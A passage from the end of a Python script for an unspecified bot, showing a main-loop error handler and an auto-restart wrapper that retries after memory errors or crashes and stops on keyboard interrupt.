        except Exception as e:
            logger.error(f"[MAIN] Unexpected error in main loop: {e}")
            time.sleep(2)   # brief pause then continue — don't exit


if __name__ == "__main__":
    while True:   # auto-restart on unexpected crash
        try:
            shutdown_event.clear()   # reset shutdown flag for restart
            gc.collect()  # clean up before each run
            main()
            break   # clean exit (shutdown_event set) — don't restart
        except KeyboardInterrupt:
            bot_console.print(f"\n[yellow]⚠️  Bot stopped by user[/yellow]")
            break
        except MemoryError:
            gc.collect()
            bot_console.print(f"[red]✘ Memory error — forcing GC and restarting in 3s...[/red]")
            time.sleep(3)
        except Exception as e:
            bot_console.print(f"[red]✘ Unexpected error: {e} — restarting in 5s...[/red]")
            time.sleep(5)   # wait then restart automatically